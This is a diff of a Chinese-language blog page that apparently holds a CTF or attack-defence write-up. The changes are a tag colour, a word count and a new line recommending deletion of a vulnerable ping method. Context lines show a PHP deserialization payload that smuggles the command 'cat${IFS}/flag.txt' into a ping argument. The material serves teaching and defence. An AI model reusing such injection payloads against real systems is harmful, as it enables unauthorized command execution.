@@ -235,7 +235,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Docker/" style="color: #00bcd4">Docker</a>
+                <a href="/blog/tags/Docker/" style="color: #ffa2c4">Docker</a>
             </span>
             
             <span class="tag">
@@ -254,7 +254,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">897字</span>
+        <span class="post-count">906字</span>
       </span>
     </span>
 
@@ -425,6 +425,7 @@
 <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">home</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.1|cat$&#123;IFS&#125;/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>修复方法：删除ping方法</p>
 <hr>
 <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>尝试上传一个文件，发现 &#x2F;var&#x2F;www&#x2F;html 下没有upload目录无法上传</p>
 <p>全局搜索，对应的源码在&#x2F;var&#x2F;www&#x2F;html&#x2F;lib&#x2F;User.php：</p>
